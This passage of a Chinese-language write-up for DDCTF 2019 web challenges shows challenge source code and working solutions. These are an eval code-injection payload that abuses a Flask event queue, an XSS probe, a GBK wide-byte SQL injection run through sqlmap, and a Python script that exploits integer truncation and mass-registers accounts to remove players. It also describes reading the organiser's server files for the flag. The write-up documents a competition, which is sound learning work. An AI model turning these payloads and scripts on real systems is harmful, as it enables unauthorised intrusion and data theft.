    def execute_event_loop(): 
        valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') 
        resp = None 
        while len(request.event_queue) > 0: 
            event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......" 
            request.event_queue = request.event_queue[1:] 
            if not event.startswith(('action:', 'func:')): continue 
            for c in event: 
                if c not in valid_event_chars: break 
            else: 
                is_action = event[0] == 'a' 
                action = get_mid_str(event, ':', ';') 
                args = get_mid_str(event, action+';').split('#') 
                try: 
                    event_handler = eval(action + ('_handler' if is_action else '_function')) 
                    ret_val = event_handler(args) 
                except RollBackException: 
                    if resp is None: resp = '' 
                    resp += 'ERROR! All transactions have been cancelled. ' 
                    resp += 'Go back to index.html' 
                    session['num_items'] = request.prev_session['num_items'] 
                    session['points'] = request.prev_session['points'] 
                    break 
                except Exception, e: 
                    if resp is None: resp = '' 
                    #resp += str(e) # only for debugging 
                    continue 
                if ret_val is not None: 
                    if resp is None: resp = ret_val 
                    else: resp += ret_val 
        if resp is None or resp == '': resp = ('404 NOT FOUND', 404) 
        session.modified = True 
        return resp 
    app.route(url_prefix+'/') 
    def entry_point(): 
        querystring = urllib.unquote(request.query_string) 
        request.event_queue = [] 
        if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100: 
            querystring = 'action:index;False#False' 
        if 'num_items' not in session: 
            session['num_items'] = 0 
            session['points'] = 3 
            session['log'] = [] 
        request.prev_session = dict(session) 
        trigger_event(querystring) 
        return execute_event_loop() 
    # handlers/functions below -------------------------------------- 
    def view_handler(args): 
        page = args[0] 
        html = '' 
        html += '[INFO] you have {} diamonds, {} points now.'.format(session['num_items'], session['points']) 
        if page == 'index': 
            html += 'View source code' 
            html += 'Go to e-shop' 
            html += 'Reset' 
        elif page == 'shop': 
            html += 'Buy a diamond (1 point)' 
        elif page == 'reset': 
            del session['num_items'] 
            html += 'Session reset.' 
        html += 'Go back to index.html' 
        return html 
    def index_handler(args): 
        bool_show_source = str(args[0]) 
        bool_download_source = str(args[1]) 
        if bool_show_source == 'True': 
            source = open('eventLoop.py', 'r') 
            html = '' 
            if bool_download_source != 'True': 
                html += 'Download this .py file' 
                html += 'Go back to index.html' 
            for line in source: 
                if bool_download_source != 'True': 
                    html += line.replace('&','&amp;').replace('\t', '&nbsp;'*4).replace(' ','&nbsp;').replace('','&gt;').replace('\n', '') 
                else: 
                    html += line 
            source.close() 
            if bool_download_source == 'True': 
                headers = {} 
                headers['Content-Type'] = 'text/plain' 
                headers['Content-Disposition'] = 'attachment; filename=serve.py' 
                return Response(html, headers=headers) 
            else: 
                return html 
        else: 
            trigger_event('action:view;index') 
    def buy_handler(args): 
        num_items = int(args[0]) 
        if num_items '.format(args[0]) 
        session['num_items'] += num_items  
        trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index']) 
    def consume_point_function(args): 
        point_to_consume = int(args[0]) 
        if session['points'] ' 
    def get_flag_handler(args): 
        if session['num_items'] >= 5: 
            trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries 
        trigger_event('action:view;index') 
    if __name__ == '__main__': 
        app.run(debug=False, host='0.0.0.0')
通读一遍代码之后可以发现这个题的代码逻辑和常规的flask开发不太一样
  * 路由和功能的绑定 通常flask代码是用@app.route(‘/path’)装饰一个方法的形式来做路由，但是这段代码按照第一个;和第一个#分割路由和传入功能的参数，并且在eval那点的字符串可控
  *   * 路由的异步性 要进行的操作都会放在一个队列里面，先进队列的先执行。
  *   * 后续的购买操作同样是这样，买东西的时候并不会立刻check是否点数合乎要求，而是先把num_items加上在被check路由放进队列。 
代码注入意味着我可以劫持程序运行的流程，结合路由的特性我可以直接注入我想要几个的操作一及其参数一次性加入到路由队列中（buy_handler+get_flag），又因为路由的异步性check路由在我get_flag路由之后，这样就可以在check金钱是否合理之前拿到flag。程序会把flag放在session中而根据flask客户端session的特性即可读出flag
  *   *   * 最终payload如下
action:trigger_event#;action:buy;10#action:get_flag;#a:show_flag;1
    python decodeflask.py .eJxtzlFrwjAUBeC_MvLsQ9oiXQo-KDMFIYZtmUkzxmiMk8YkltXaLeJ_X_FBcPbtwjl895yA3W9B9n4CDwpkoOBLWHLUUv_yW3LtpVh8SSGt8s-Gxtjo3B6VqSstdilhU3PtO201Rk7l2NNuMgHn0R3pFtGGNT9keonv0v_Ax1WQftUWoTYqHgfNIyuS2bHkY0jDvBuQvKylWKd9YyfF9iLdQqHMUSJi2RR8nZKkgGT1GLRZtv2AhjzNOhFjKvsxbI7Za4QMg-hb5W9DsweeAd-6z-qwcQ3I4AjU-8of-jM5_wEps3QC.D5IA3A.NigoaBZy6wUzszTAv0mYX2jqdu4
    {u'points': 3, u'num_items': 0, u'log': ['action:trigger_event#;action:buy;10#action:get_flag;', ['action:buy;10', 'action:get_flag;'], ['func:consume_point;10', 'action:view;index'], 'func:show_flag;3v41_3v3nt_l00p_aNd_fLASK_cOOkle', 'action:view;index']}
## 0x05：欢迎报名DDCTF
题目链接：http://117.51.147.2/Ze02pQYLf5gGNyMn/ 之前一直各种测sql注入没反应，后来祭出了万能poc，发现是xss
    App"/>
    '${9*9}[!--+*)(&
用在线xss平台可以打到后台网页源码，页面源码中泄漏了一个接口。
    http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1
当时一直卡在这里，遍历了id没反应，用xss测试之前发现的几个页面也没有发现（知道本题结做完我都不知道login.php干嘛的）。后来等到提示说是注入，注意到泄露的这个接返回的content-type是gbk，猜测这里是宽子节注入，手测没测出来，试试sqlmap的神秘力量。
inject.txt
    GET /Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df* HTTP/1.1
    Host: 117.51.147.2
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://117.51.147.2/Ze02pQYLf5gGNyMn/
    Connection: close
    Upgrade-Insecure-Requests: 1
sqlmap跑一波
    python sqlmap.py -r inject.txt --level 3
最后dump字段的时候sqlmap忽然开始盲注了，为了尽快做出来直接用sqlmap的payload手注了一下
## 0x06：大吉大利,今晚吃鸡~
题目链接：http://117.51.147.155:5050/index.html#/login
经过测试订单的钱可以改只要大于1000就可以，最后购买的时候在处理32-64位之间的整数时，会取到低32位。凭票入场之后就是吃鸡战场，每一个入场的选手都会又一个id和ticket，输入别人的就可以让人数减一。手快不如工具快，老汉能把青年赛，放脚本批量注册小号批量杀就可以了。
    import requests
    import json
    import time
    import uuid
    import hashlib
    proxies = {'http':'127.0.0.1:8080'}
    def create_md5():
        m=hashlib.md5()
        m.update(bytes(str(time.time())))
        return m.hexdigest()
    def register_pay():
        session = requests.Session()
        paramsGet = {"name":create_md5(),"password":create_md5()}
        print(paramsGet)
        headers = {"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
        response = session.get("http://117.51.147.155:5050/ctf/api/register", params=paramsGet, headers=headers, proxies=proxies)
        time.sleep(0.5)
        print(session.cookies)
        #print("Status code:   %i" % response.status_code)
        #print("Response body: %s" % response.content)
        paramsGet = {"ticket_price":"4294967296"}
        headers = {"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
        response = session.get("http://117.51.147.155:5050/ctf/api/buy_ticket", params=paramsGet, headers=headers, proxies=proxies)
        time.sleep(0.5)
        #print("Status code:   %i" % response.status_code)
        #print("Response body: %s" % response.content)
        headers = {"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
        response = session.get("http://117.51.147.155:5050/ctf/api/search_bill_info", headers=headers, proxies=proxies)
        # print(response.text)
        bill_id = json.loads(response.text)['data'][0]["bill_id"]
        time.sleep(0.5)
        #print("Status code:   %i" % response.status_code)
        #print("Response body: %s" % response.content)
        paramsGet = {"bill_id":bill_id}
        headers = {"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
        response = session.get("http://117.51.147.155:5050/ctf/api/pay_ticket", params=paramsGet, headers=headers, proxies=proxies)
        #print("Status code:   %i" % response.status_code)
        #print("Response body: %s" % response.content)
        time.sleep(0.5)
        headers = {"Accept":"application/json","Cache-Control":"max-age=0","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
        response = session.get("http://117.51.147.155:5050/ctf/api/search_ticket", headers=headers, proxies=proxies)
        #print("Status code:   %i" % response.status_code)
        #print("Response body: %s" % response.content)
        #print(response.text)
        id = json.loads(response.text)['data'][0]['id']
        ticket = json.loads(response.text)['data'][0]['ticket']
        print(id, ticket)
        return id,ticket
    def kill(id, ticket):
        time.sleep(0.5)
        session = requests.Session()
        paramsGet = {"ticket":ticket,"id":id}
        headers = {"Accept":"application/json","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0","Referer":"http://117.51.147.155:5050/index.html","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
        cookies = {"REVEL_SESSION":"3b2bacbee8fb18e1b1457171b422999d","user_name":"cl0und"}
        response = session.get("http://117.51.147.155:5050/ctf/api/remove_robot", params=paramsGet, headers=headers, cookies=cookies)
        print("Status code:   %i" % response.status_code)
        print("Response body: %s" % response.content)
    if __name__ == '__main__':
        while True:
            try:
                id, ticket = register_pay()
                kill(id, ticket)
                time.sleep(0.5)
            except Exception as e:
                print e
杀完之后就有flag
###  大吉大利,今晚吃鸡~ 非预期解法
赛后看了其他师傅的wp，发现有些师傅以为这道考的是golang的整形溢出+批量kill小号，其实看到出题人的源码之后才知道。出题人是用python(flask)模拟了一个golang整形溢出的web环境，并且吃鸡战场的本意是想考hash长度扩展攻击（心情复杂.jpg）。发现这点原因是通过读mysql那道题的.bash_history可以发现出题人把这两道题放在同一台服务器上的。
实际读一下，可以发现web2对应的是mysql题
web1对应的是吃鸡题
在/home/dc2-user/ctf_web_1/web_1/app/main/views.py可以把部分主干代码都读出来(工具问题，换个工具应该可以读全)，这里已经有可以看到flag了
    # coding=utf-8
    from flask import jsonify, request,redirect
    from app import mongodb
    from app.unitis.tools import get_md5, num64_to_32
    from app.main.db_tools import get_balance, creat_env_db, search_bill, secrity_key, get_bill_id
    import uuid
    from urllib import unquote
    mydb = mongodb.db
    flag = '''DDCTF{chiken_dinner_hyMCX[n47Fx)}'''
    def register():
        result = []
        user_name = request.args.get('name')
        password = request.args.get('password')
        if not user_name or not password:
            response = jsonify({"code": 404, "msg": "参数不能为空", "data": []})
            return response
        if not len(password)>=8:
            response = jsonify({"code": 404, "msg": "密码必须大于等于8位", "data": []})
            return response
        else:
            hash_val = get_md5(user_name, 'DDCTF_2019')
            if not mydb.get_collection('account').find_one({'user_name': user_name}):
                mydb.get_collection('account').insert_one({'user_name': user_name, 'password' :password, 'balance': 100,
                                                           'hash_val': hash_val, 'flag': 'test'})
                tmp_result = {'user_name': user_name, 'account': 100}
                result.append(tmp_result)
                response = jsonify({"code": 200, "msg": "用户注册成功", "data": result})
                response.set_cookie('user_name', user_name)
                response.set_cookie('REVEL_SESSION', hash_val)
                response.headers['Server'] = 'Caddy'
                return response
            else:
                response = jsonify({"code": 404, "msg": "用户已存在", "data": []})
                response.set_cookie('user_name', user_name)
                response.set_cookie('REVEL_SESSION', hash_val)
                response.headers['Server'] = 'Caddy'
                return response
    def login():
        result = []
        user_name = request.args.get('name')
        password = request.args.get('password')
        if not user_name or not password:
            response = jsonify({"code": 404, "msg": "参数不能为空", "data": []})
            return response
        if not mydb.get_collection('account').find_one({'user_name': user_name}):
            response = jsonify({"code": 404, "msg": "该用户未注册", "data": result})
            return response
        if not password == mydb.get_collection('account').find_one({'user_name': user_name})['password']:
            response = jsonify({"code": 404, "msg": "密码错误", "data": result})
            return response
        else:
            hash_val = mydb.get_collection('account').find_one({'user_name': user_name})['hash_val']
            response = jsonify({"code": 200, "msg": "登陆成功", "data": result})